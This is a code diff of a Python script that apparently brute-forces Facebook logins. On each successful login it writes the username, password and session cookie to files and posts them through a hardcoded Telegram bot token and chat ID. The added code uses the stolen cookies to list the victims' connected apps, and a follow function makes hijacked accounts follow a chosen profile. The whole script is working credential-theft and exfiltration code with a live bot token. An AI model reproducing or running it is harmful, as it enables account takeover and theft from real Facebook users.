@@ -373,6 +373,38 @@ c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}
 mtd,cp_xdx,cokix=[],[],[]
 token = ('6628496363:AAFRd1HpukVfL1uuaXfUPABhyaAfLYkzRTU')
 ID = ('1778046662')
+def cek_apk(session,coki):
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s \x1b[1;95m ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s \x1b[1;95m ◇ Your Expired Apps ◇    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+ 
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100084492703624&mibextid=ZbWKwL', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
 def clear():
   os.system('clear')
 import requests,os
@@ -1025,6 +1057,7 @@ def m1(idf,pwv):
     if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            cek_apk(session,coki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1198,6 +1231,7 @@ def m4(idf,pwv):
     if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            cek_apk(session,coki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1265,6 +1299,7 @@ def m5(idf,pwv):
     if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            cek_apk(session,coki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1332,6 +1367,7 @@ def m6(idf,pwv):
     if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            cek_apk(session,coki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1418,6 +1454,7 @@ def m7(idf,pwv):
                     if 'Photoshop' in res:
                             print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
                             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
+                            cek_apk(session,coki)
                             statusok = (f" {user} | {ps} | {coki} ")
                             open('/sdcard/ATOM-M7-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1503,6 +1540,7 @@ def m8(idf,pwv):
                     if 'Photoshop' in res:
                             print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
                             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
+                            cek_apk(session,coki)
                             open('/sdcard/ATOM-M8-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                             statusok = (f" {user} | {ps} | {coki} ")
                             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
